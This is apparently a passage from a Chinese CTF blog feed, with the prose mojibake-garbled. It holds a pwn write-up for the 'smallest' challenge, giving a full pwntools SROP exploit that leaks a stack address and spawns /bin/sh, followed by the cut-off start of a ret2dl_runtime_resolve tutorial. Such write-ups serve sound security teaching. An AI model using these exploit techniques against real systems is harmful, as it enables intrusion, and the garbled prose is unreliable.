class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">assert</span> <span class="built_in">len</span>(<span class="built_in">bytes</span>(s)) == <span class="number">80</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>unpack_many(<span class="built_in">bytes</span>(s))</span><br><span class="line">[<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6295552</span>, <span class="number">7</span>, <span class="number">4096</span>, <span class="number">125</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">115</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">123</span>, <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>ä¸‹é¢å°±ç”¨ä¸€é“é¢˜æ¥çœ‹çœ‹<code>SigreturnFrame() </code>æ¨¡å—æ€ä¹ˆç”¨å§ï¼</p><h4 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h4><h5 id="360chunqiu2017-smallest"><a href="#360chunqiu2017-smallest" class="headerlink" title="360chunqiu2017_smallest"></a>360chunqiu2017_smallest</h5><p>çœ‹ä¸‹ä¿æŠ¤ï¼Œå°±å¼€äº†NX</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>ç¨‹åºçŸ­çš„ç¦»è°±ï¼Œå°±ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ä¸º<code>read(0,rsp,400h)</code>ï¼Œä½†æ˜¯è¿™é‡Œæ²¡æœ‰SROPçš„ç³»ç»Ÿè°ƒç”¨å·15å‘€ï¼Ÿé‚£è¯¥æ€ä¹ˆè°ƒç”¨å®ƒå‘¢ï¼Ÿç­”ï¼š<code>read</code>å‡½æ•°è¿”å›å€¼ä¼šåˆ°<code>rax</code>ä¸­ï¼š</p><blockquote><p><code>ssize_t read ^[1]^ (int fd, void *buf, size_t count);</code><br>æˆåŠŸè¿”å›è¯»å–çš„å­—èŠ‚æ•°ï¼Œå‡ºé”™è¿”å›-1å¹¶è®¾ç½®<code>errno</code>ï¼Œå¦‚æœåœ¨è°ƒ<code>read</code>ä¹‹å‰å·²åˆ°è¾¾æ–‡ä»¶æœ«å°¾ï¼Œåˆ™è¿™æ¬¡<code>read</code>è¿”å›0ã€‚</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004000B0 start           proc near               ; DATA XREF: LOAD:0000000000400018â†‘o</span><br><span class="line">.text:00000000004000B0                 xor     rax, rax</span><br><span class="line">.text:00000000004000B3                 mov     edx, 400h       ; count</span><br><span class="line">.text:00000000004000B8                 mov     rsi, rsp        ; buf</span><br><span class="line">.text:00000000004000BB                 mov     rdi, rax        ; fd</span><br><span class="line">.text:00000000004000BE                 syscall                 ; LINUX - sys_read</span><br><span class="line">.text:00000000004000C0                 retn</span><br><span class="line">.text:00000000004000C0 start           endp</span><br></pre></td></tr></table></figure><p>ç°åœ¨å·²ç»ç›´åˆ°äº†è§¦å‘SROPçš„æ–¹æ³•ï¼Œæˆ‘ä»¬éƒ½çŸ¥é“ç”¨<code>execve</code>æ¥<code>getshell</code>æ˜¯éœ€è¦ä¼ å…¥<code>/bin/sh</code>åœ°å€çš„ï¼Œä½†åœ¨æ­¤é¢˜ç›®å½“ä¸­æ—¢æ²¡æœ‰è¿™ä¸ªå­—ç¬¦ä¸²ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">âœ  one_gadget smallest </span><br><span class="line">[OneGadget] ArgumentError: File <span class="string">&quot;smallest&quot;</span> doesn<span class="string">&#x27;t contain string &quot;/bin/sh&quot;, not glibc?</span></span><br></pre></td></tr></table></figure><p>åŒæ—¶åˆæ˜¯é™æ€é“¾æ¥ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">âœ  file  smallest</span><br><span class="line">smallest: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥éœ€è¦å†™å…¥åˆ°æŸä¸ªåœ°æ–¹ï¼Œå¹¶ä¸”è¿™ä¸ªåœ°æ–¹çš„åœ°å€æ˜¯å¯çŸ¥çš„ï¼Œçœ‹ä¸‹<code>vmmap</code>åªæœ‰<code>stack</code>èƒ½è¯»å†™ï¼Œ<del>åŒæ—¶è¿™é‡Œé¢å¹¶æ²¡æœ‰<code>mprotect</code>æ¥ä¿®æ”¹é¡µå±æ€§</del>ï¼ˆå¯ä»¥ç”¨ç³»ç»Ÿè°ƒç”¨ï¼‰ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">          0x400000           0x401000 r-xp     1000 0      /smallest</span><br><span class="line">    0x7ffff7ffb000     0x7ffff7ffe000 r--p     3000 0      [vvar]</span><br><span class="line">    0x7ffff7ffe000     0x7ffff7fff000 r-xp     1000 0      [vdso]</span><br><span class="line">    0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 --xp     1000 0      [vsyscall]</span><br></pre></td></tr></table></figure><p>æ—¢ç„¶åªèƒ½å†™æ ˆï¼Œé‚£å°±å¾—å…ˆæ³„éœ²æ ˆåœ°å€ï¼Œæ€ä¹ˆæ³„éœ²å‘¢ï¼Ÿåˆšåˆšè¯´åˆ°æˆ‘ä»¬å¯ä»¥ä¿®æ”¹å®ƒçš„ç³»ç»Ÿè°ƒç”¨ï¼Œå¯¹å§ï¼æ‰€ä»¥æˆ‘ä»¬è¯»å…¥ä¸€ä¸ªå­—ç¬¦æ¥ä¿®æ”¹<code>rax</code>ä¸º1ï¼ŒåŒæ—¶è¿˜è¦é˜²æ­¢å®ƒæ‰§è¡Œ<code>.text:00000000004000B0  xor  rax, rax</code>ï¼Œä¸ç„¶ä¸€åˆ‡è¿˜æ˜¯ç™½è´¹äº†ï¼ï¼Œé‚£æ€ä¹ˆåŠå‘¢ï¼Ÿå›åˆ°ç¬¬ä¸€ä¸ªçš„<code>read</code>ï¼Œæˆ‘ä»¬åæ±‡ç¼–çœ‹ä¸€ä¸‹ï¼Œæ¬¸å˜¿ï¼å®ƒæ˜¯å¾€è¿”å›åœ°å€ä¸Šå†™çš„æ¬¸ï¼ˆIDA 7.5å·²ç»å¸®æˆ‘ä»¬åˆ†æå‡ºæ¥äº†ï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 <span class="title">start</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *retaddr; <span class="comment">// [rsp+0h] [rbp+0h] BYREF</span></span><br><span class="line">  <span class="keyword">return</span> sys_read(<span class="number">0</span>, (<span class="keyword">char</span> *)&amp;retaddr, <span class="number">0x400</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç›´æ¥å¾€<code>&amp;retaddr</code>å†™å…¥å€¼ï¼Œå°±åŠ«æŒæ§åˆ¶æµï¼Œé¦–å…ˆæˆ‘ä»¬è‚¯å®šæ˜¯è¦è®©å®ƒæˆåŠŸè¯»å…¥ä¸€ä¸ªå­—èŠ‚å¹¶ä»<code>0x4000B3</code>å¼€å§‹æ‰§è¡Œï¼Œè¿™æ ·å°±æ‰§è¡Œäº†<code>write(1,buf,0x400)</code>ï¼ˆ<code>edx</code>å’Œ<code>esi</code>éƒ½æ²¡åŠ¨ï¼‰ï¼Œç”±äºå®ƒåªæ‰§è¡Œä¸€æ¬¡<code>read</code>ï¼Œæ‰€ä»¥è¦å¾€<code>&amp;retaddr</code>å¤šå†™ä¸€ç‚¹ï¼Œå°±å¯ä»¥æŒç»­æ§åˆ¶æ‰§è¡Œæµï¼Œè¯»å®Œä¹‹åå°±è·³åˆ°<code>0x4000B0</code>ï¼Œåˆå›æ¥ç¨‹åºå…¥å£ï¼Œè¿™æ¬¡å°±è¯»å…¥<code>\xb3</code>ï¼Œä¿®æ”¹è¿”å›çš„åœ°å€ç»•è¿‡æ¸…é›¶<code>rax</code>çš„è¯­å¥ï¼Œå°±æ‰§è¡Œäº†<code>write(1,buf,0x400)</code>æ³„éœ²æ ˆåœ°å€ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0x4000B0</span>)*<span class="number">3</span></span><br><span class="line"><span class="comment"># sleep(0.5)</span></span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="comment"># raw_input()</span></span><br><span class="line">io.send(<span class="string">&#x27;\xb3&#x27;</span>)</span><br></pre></td></tr></table></figure><p>æ³„éœ²å®Œæ ˆåœ°å€ä¹‹åï¼Œå°±å¯ä»¥å¾€æ ˆä¸Šå†™<code>/bin/sh</code>æ‰§è¡Œ<code>execve</code>å•¦ï¼ï¼Œä½†æ˜¯åœ¨æ­¤ä¹‹å‰è¿˜æœ‰ä¸€ä¸ªé—®é¢˜å°±æ˜¯æ ˆé¡¶çš„ä½ç½®å¹¶ä¸æ˜¯æŒ‡å‘æˆ‘ä»¬çš„SROPçš„ï¼Œæ‰€ä»¥è¿˜è¦åšä¸€æ¬¡è¿ç§»åˆ°<code>sigframe</code>å¤„ï¼Œè°ƒç”¨<code>SYS_read</code>æ¥è¯»å…¥<code>execve</code>çš„<code>sigframe</code>é¡ºä¾¿æ ˆè¿ç§»ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_read</span><br><span class="line">sigframe.rdi = <span class="number">0</span></span><br><span class="line">sigframe.rsi = stack_addr</span><br><span class="line">sigframe.rdx = <span class="number">0x400</span></span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line">sigframe.rip = <span class="number">0x004000BE</span></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.send(p64(<span class="number">0x4000B0</span>)+p64(<span class="number">0</span>)+<span class="built_in">str</span>(sigframe))</span><br><span class="line">raw_input(<span class="string">&quot;zyen&quot;</span>)</span><br><span class="line">io.send(p64(<span class="number">0x004000BE</span>)+<span class="string">&#x27;b&#x27;</span>*<span class="number">7</span>)</span><br></pre></td></tr></table></figure><p>å†æ¬¡SROPå°±èƒ½æ‰§è¡Œ<code>execve(&quot;/bin/sh&quot;,0,0)</code></p><p>å®Œæ•´expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;smallest&#x27;</span>)</span><br><span class="line"><span class="comment"># io = remote(&#x27;node4.buuoj.cn&#x27;,25243)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;smallest&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;b *0x4000Be&quot;)</span></span><br><span class="line">payload = p64(<span class="number">0x4000B0</span>)*<span class="number">3</span></span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">raw_input(<span class="string">&quot;zyen&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.send(<span class="string">&#x27;\xb3&#x27;</span>)</span><br><span class="line">raw_input(<span class="string">&quot;zyen&quot;</span>)</span><br><span class="line">stack_addr = u64(io.recv()[<span class="number">8</span>:<span class="number">16</span>]) <span class="comment">#&amp; 0xfffffffffffffff000 - 0x1000</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] stack_addr =&gt; &quot;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_read</span><br><span class="line">sigframe.rdi = <span class="number">0</span></span><br><span class="line">sigframe.rsi = stack_addr</span><br><span class="line">sigframe.rdx = <span class="number">0x400</span></span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line">sigframe.rip = <span class="number">0x004000BE</span></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.send(p64(<span class="number">0x4000B0</span>)+p64(<span class="number">0</span>)+<span class="built_in">str</span>(sigframe))</span><br><span class="line">raw_input(<span class="string">&quot;zyen&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.send(p64(<span class="number">0x004000BE</span>)+<span class="string">&#x27;b&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">raw_input(<span class="string">&quot;zyen&quot;</span>)</span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = stack_addr + <span class="number">0x300</span>  <span class="comment"># &quot;/bin/sh&quot; &#x27;s addr</span></span><br><span class="line">sigframe.rsi = <span class="number">0x0</span></span><br><span class="line">sigframe.rdx = <span class="number">0x0</span></span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line"><span class="comment"># sigframe.rsp = stack_addr+ 0x190</span></span><br><span class="line">sigframe.rip = <span class="number">0x004000BE</span></span><br><span class="line">payload = p64(<span class="number">0x4000B0</span>)+p64(<span class="number">0</span>)+<span class="built_in">str</span>(sigframe)</span><br><span class="line">payload = payload+(<span class="number">0x300</span>-<span class="built_in">len</span>(payload))*<span class="string">&#x27;\x00&#x27;</span>+<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"><span class="comment"># sleep(1)</span></span><br><span class="line">io.send(payload)</span><br><span class="line">raw_input(<span class="string">&quot;zyen&quot;</span>)</span><br><span class="line"><span class="comment"># sleep(1)</span></span><br><span class="line">io.send(p64(<span class="number">0x004000BE</span>)+<span class="string">&#x27;b&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">raw_input(<span class="string">&quot;zyen&quot;</span>)</span><br><span class="line"><span class="comment"># sleep(1)</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>å‚è€ƒé“¾æ¥ï¼š</p><p><a href="https://www.wangan.com/docs/1081"> SROP</a></p><p><a href="https://www.dazhuanlan.com/freedeaths/topics/1225728">360æ˜¥ç§‹æ¯smallest</a></p><p><a href="https://www.cnblogs.com/bhxdn/p/14281505.html">SROPä¾‹é¢˜</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTFå°çŸ¥è¯† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ret2dl_runtime_resovle</title>
      <link href="/2021/10/05/ret2dl-runtime-resovle/"/>
      <url>/2021/10/05/ret2dl-runtime-resovle/</url>
      
        <content type="html"><![CDATA[<h1 id="ret2dl-runtime-resovle"><a href="#ret2dl-runtime-resovle" class="headerlink" title="ret2dl_runtime_resovle"></a>ret2dl_runtime_resovle</h1><blockquote><p>å‰é¢å·²ç»è®²å®Œäº†PLTå’ŒGOTè¡¨çš„ä½œç”¨ï¼Œåœ¨é‚£å„¿æˆ‘ç•™äº†ä¸€æ‰‹ï¼Œå¹¶æ²¡æœ‰è®²æ¸…æ¥š<code>_dl_runtime_resolve_</code>è¿™ä¸ªå‡½æ•°å…·ä½“å®ç°ï¼Œè¿˜è®°å¾—å½“æ—¶ç¨‹åºå¾€æ ˆä¸Špushäº†ä¸¤ä¸ªå‚æ•°å°±è¿›å…¥<code>_dl_runtime_resolve_</code>äº†å—ï¼Ÿä¸è®°å¾—å¯ä»¥å›å»ç¿»ä¸‹</p></blockquote><p>æˆ‘ä»¬å›å¿†ä¸€ä¸‹å½“æ—¶é‚£ä¸¤ä¸ªå‚æ•°æ˜¯ä»€ä¹ˆï¼Œæ²¡é”™ï¼Œä¸€ä¸ªæ˜¯<code>0</code>ï¼Œä¸€ä¸ªæ˜¯<code>0x804a004</code>ï¼Œè¿™é‡Œå…ˆè®²ä»–ä»¬æ˜¯å•¥ï¼Œ0å‘¢ï¼Œæˆ‘ä»¬å…ˆç†è§£æˆä¸€ä¸ªIndexï¼Œè€Œ<code>0x804a004</code>æ˜¯ä¸€ä¸ªå‡½æ•°åœ°å€å«<code>link_map</code>ï¼Œå…¶å®<code>_dl_runtime_resolve_</code>æ˜¯é€šè¿‡<code>link_map</code>æ¥æ‰¾åˆ°<code>.dynamic</code>çš„</p><img src="/2021/10/05/ret2dl-runtime-resovle/1.png" class=""><p>è€Œ.<code>dynamic</code>æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿæˆ‘ä»¬éšä¾¿æ‹‰ä¸€ä¸ªç¨‹åºè¿›IDAæ¥çœ‹ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°é‡Œé¢æœ‰ä¸€äº›ç»“æ„ä½“ï¼Œå…¶å®å’Œ<code>_dl_runtime_resolve_</code>ç´§å¯†ç›¸å…³çš„åªæœ‰ä¸‰ä¸ªï¼š<code>DT_STRTAB</code>, <code>DT_SYMTAB</code>ï¼Œ<code>DT_JMPREL</code>è¿™ä¸‰ä¸ªæ ¹æ®åœ°å€æˆ‘ä»¬å¯ä»¥å‘ç°å®ƒä»¬æŒ‡å‘äº†<code>.dynstr</code>ï¼Œ<code>.dynsym</code>ï¼Œ<code>.rel.plt</code></p><img src="/2021/10/05/ret2dl-runtime-resovle/5.png" class=""><p><code>link_map+0x8</code>çš„ä½ç½®å°±æ˜¯å®ƒè¦æ‰¾çš„<code>.dynamic</code>ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å†é€šè¿‡<code>.dynamic</code>æ‰¾åˆ°<code>.dynstr</code>ï¼Œ <code>.dynsym</code>ï¼Œ`.rel.plt</p><img src="/2021/10/05/ret2dl-runtime-resovle/3.png" class=""><p><code>.dynstr</code> çš„åœ°å€æ˜¯ <code>.dynamic + 0x44 -&gt; 0x0804821c</code></p><p><code>.dynsym</code> çš„åœ°å€æ˜¯ <code>.dynamic + 0x4c -&gt; 0x080481cc</code></p><p><code>.rel.plt</code> çš„åœ°å€æ˜¯ <code>.dynamic + 0x84 -&gt; 0x08048298</code></p><p>æˆ‘ä»¬çœ‹ä¸Šé¢çš„IDAä¹Ÿæ˜¯è¿™ä¸ªåœ°å€</p><img src="/2021/10/05/ret2dl-runtime-resovle/4.png" class=""><p>åˆ°è¿™é‡Œå¦å¤–ä¸€ä¸ª<code>push</code>åˆ°æ ˆä¸Šçš„å‚æ•°å°±èµ·ä½œç”¨äº†</p><p>å°†<code>.rel.plt</code> çš„åœ°å€åŠ ä¸Šå‚æ•° <code>reloc_arg</code>ï¼Œå³<code>0x8048298+0x0 = 0x8048298</code></p><img src="/2021/10/05/ret2dl-runtime-resovle/6.png" class=""><p>è¿™é‡Œå°±æ˜¯é‡å®šä½è¡¨é¡¹ï¼Œè¿™é‡Œä¹Ÿæ˜¯ä¸€ä¸ªç»“æ„ä½“ï¼Œå°†<code>r_info&gt;&gt;8</code>ï¼Œå³<code>0x00000107&gt;&gt;8 = 1</code>ä½œä¸º<code>.dynsym</code>ä¸­çš„ä¸‹æ ‡</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"> Elf32_Addr  r_offset;<span class="comment">//æŒ‡å‘GOTè¡¨çš„æŒ‡é’ˆ</span></span><br><span class="line"> Elf32_Word  r_info;</span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure><img src="/2021/10/05/ret2dl-runtime-resovle/7.png" class=""><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"> Elf32_Word  st_name; <span class="comment">//ç¬¦å·ååç§»ï¼Œä¹Ÿå°±æ˜¯ç›¸å¯¹.dynstrçš„åç§»</span></span><br><span class="line"> Elf32_Addr  st_value;<span class="comment">//è¯¥å­—æ®µä¸º0</span></span><br><span class="line"> Elf32_Word  st_size;<span class="comment">//è¯¥å­—æ®µä¸º0</span></span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info; <span class="comment">//å¯¼å…¥ç¬¦å·ï¼Œå›¾ä¸­æ˜¯0x12</span></span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;<span class="comment">//è¯¥å­—æ®µä¸º0</span></span><br><span class="line"> Elf32_Section st_shndx;<span class="comment">//è¯¥å­—æ®µä¸º0</span></span><br><span class="line">&#125;Elf32_Sym;</span><br></pre></td></tr></table></figure><p><code>.dynstr + st_name</code>å°±æ˜¯è¿™ä¸ªå‡½æ•°çš„ç¬¦å·åå­—ç¬¦ä¸² </p><p><code>0x0804821c+0x1a = 0x8048236</code></p><img src="/2021/10/05/ret2dl-runtime-resovle/8.png" class=""><p>IDAä¸Šçš„å­—ç¬¦ä¸²è¡¨</p><img src="/2021/10/05/ret2dl-runtime-resovle/9.png" class=""><p>æœ€ååœ¨åŠ¨æ€é“¾æ¥åº“æŸ¥æ‰¾è¿™ä¸ªå‡½æ•°çš„åœ°å€ï¼Œå¹¶ä¸”æŠŠåœ°å€èµ‹å€¼ç»™<code>rel-&gt;r_offset</code>ï¼Œå³<code>GOT</code>è¡¨å°±å¯ä»¥äº†</p><p>å‰é¢å·²ç»è®²è§£å®Œäº†<code>_dl_runtime_resolve_</code>å‡½æ•°çš„æ‰§è¡Œæµç¨‹ï¼Œä¸‹é¢ä»æºç å±‚é¢æ¥è§£æï¼Œä¸å…³é”®çš„ä»£ç å·²ç»åˆ é™¤</p><p>åœ¨è¿›å…¥<code>_dl_runtime_resolve_</code>å‡½æ•°ä¹‹åå®ƒåˆ<code>call _dl_fixup_</code></p><img src="/2021/10/05/ret2dl-runtime-resovle/10.png" class=""><p>ä¸‹é¢æ˜¯<code>_dl_fixup_</code>çš„æºç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup (struct link_map *l, ElfW(Word) reloc_arg)</span><br><span class="line">&#123; </span><br><span class="line">  <span class="comment">//æŸ¥æ‰¾dynstrçš„ä½ç½®</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *strtab = (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br><span class="line">  <span class="comment">//æŸ¥æ‰¾é‡å®šä½è¡¨çš„ä½ç½®ï¼Œè¿™é‡Œçš„reloc_offsetæ˜¯reloc_argçš„æ„æ€</span></span><br><span class="line">  <span class="keyword">const</span> PLTREL *<span class="keyword">const</span> reloc = (<span class="keyword">const</span> <span class="keyword">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line">  <span class="comment">//æŸ¥æ‰¾relocä¸­çš„r_infoç»“æ„ä½“æˆå‘˜</span></span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">  <span class="comment">//åˆ¤æ–­ä½ä½æ˜¯å¦ä¸º7</span></span><br><span class="line">  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line">  <span class="comment">//æŸ¥æ‰¾dynstrè¡¨ä¸­çš„å­—ç¬¦ä¸²åå­—</span></span><br><span class="line">  result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="comment">//å°†å¯¹åº”çš„å‡½æ•°åœ°å€æ”¾å…¥GOTè¡¨ä¸­</span></span><br><span class="line">  value = DL_FIXUP_MAKE_VALUE (result,</span><br><span class="line">   sym ? (LOOKUP_VALUE_ADDRESS (result)</span><br><span class="line">  + sym-&gt;st_value) : <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> elf_machine_fixup_plt (l, result, reloc, rel_addr, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡è®²è§£<code>_dl_runtime_resolve_</code>å‡½æ•°ï¼Œæˆ‘ä»¬ä¹Ÿå¾ˆå®¹æ˜“çš„æƒ³åˆ°åˆ©ç”¨ç‚¹ï¼š</p><p>â€‹    1.é€šè¿‡æ§åˆ¶reloc_argæ¥å®ç°ä¼ªé€ æœ€ç»ˆè·å–çš„å‡½æ•°å­—ç¬¦ä¸²</p><p>â€‹    2.ä¿®æ”¹.dynamicå†…å­˜åŒºåŸŸå®ç°ä¼ªé€ æœ€ç»ˆè·å–çš„å‡½æ•°å­—ç¬¦ä¸²</p><p>â€‹    3.ä¼ªé€ link_mapçš„åœ°å€</p><p>ç”¨ä¸€é“ç»å…¸ä¾‹é¢˜è®²è§£ç¬¬ä¸€ç§æƒ…å†µ</p><h4 id="XDCTF2015-bof"><a href="#XDCTF2015-bof" class="headerlink" title="XDCTF2015_bof"></a>XDCTF2015_bof</h4><p>å…ˆçœ‹çœ‹ä¿æŠ¤ï¼Œæˆ‘ä»¬çœ‹åˆ°å¼€å¯äº†<code>Partial RELRO</code>ï¼Œæ‰€ä»¥å’±ä¿®æ”¹ä¸äº†<code>.dynamic</code>ï¼Œå¦å¤–è¿˜å¼€å¯äº†<code>NX</code>ä¿æŠ¤ï¼Œä¹Ÿå†™ä¸äº†<code>shellcode</code>åˆ°æ ˆä¸Š</p><img src="/2021/10/05/ret2dl-runtime-resovle/12.png" class=""><p>ç¨‹åºçš„æµç¨‹ååˆ†çš„ç®€å•ï¼Œæ‰“å°å‡º<code>Welcome to XDCTF2015~!</code>ï¼Œç´§æ¥ç€å°±æ˜¯ä¸€ä¸ªæº¢å‡ºå‡½æ•°</p><img src="/2021/10/05/ret2dl-runtime-resovle/13.png" class=""><p>æˆ‘ä»¬æŒ‰ç…§æ­£å¸¸çš„æ€è·¯èµ°ä¸€éï¼Œä¸€èˆ¬æ‹¿åˆ°æ 